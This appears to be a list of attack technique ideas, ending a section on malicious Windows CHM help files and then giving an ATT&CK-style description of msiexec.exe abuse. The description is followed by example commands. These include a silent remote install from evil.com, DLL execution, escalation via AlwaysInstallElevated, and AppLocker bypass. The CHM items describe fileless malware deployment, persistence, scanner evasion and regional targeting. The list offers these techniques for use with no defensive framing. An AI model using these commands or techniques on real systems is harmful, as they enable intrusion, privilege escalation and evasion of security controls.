          Create self-extracting CHM archives that deploy fileless malware
          Implement CHM files with time-bombed execution based on system timestamp
          Use CHM files to establish persistence through Windows Help System associations
          Create CHM files that exploit specific Internet Explorer rendering vulnerabilities
          Implement cross-CHM file references to chain multiple malicious help files
          Use CHM compilation options to obfuscate malicious content from scanners
          Create language-specific CHM variants to target specific geographical regions
          Exploit CHM search functionality to trigger malicious code execution
          Use CHM files as containers for living-off-the-land binaries and scripts
        Msiexec: Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.  Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)
          Execute remote MSI package: msiexec.exe /q /i http://evil.com/malicious.msi
          Install MSI with elevated privileges using AlwaysInstallElevated: msiexec.exe /i malicious.msi /qn with registry keys enabled
          Execute DLL through msiexec: msiexec.exe /y malicious.dll
          Silent installation with no UI: msiexec.exe /i malicious.msi /qn
          Execute JavaScript through MSI custom actions: msiexec.exe /i package.msi containing malicious JavaScript
          Use msiexec to download and execute content: msiexec.exe /i \\remote\share\package.msi
          Execute MSI package with logging for evasion: msiexec.exe /i malicious.msi /l*v log.txt
          Use embedded custom actions in MSI for code execution: msiexec.exe /i package.msi with embedded commands
          Execute MSI through COM object creation: Create MSI Installer object through COM for indirect execution
          Use msiexec to bypass AppLocker: msiexec.exe /z bypass.msi leveraging default allow rules
          Execute MSI repair operation to run code: msiexec.exe /fa package.msi
          Use msiexec with Windows Installer API: Programmatically invoke MSI installation through MsiInstallProduct
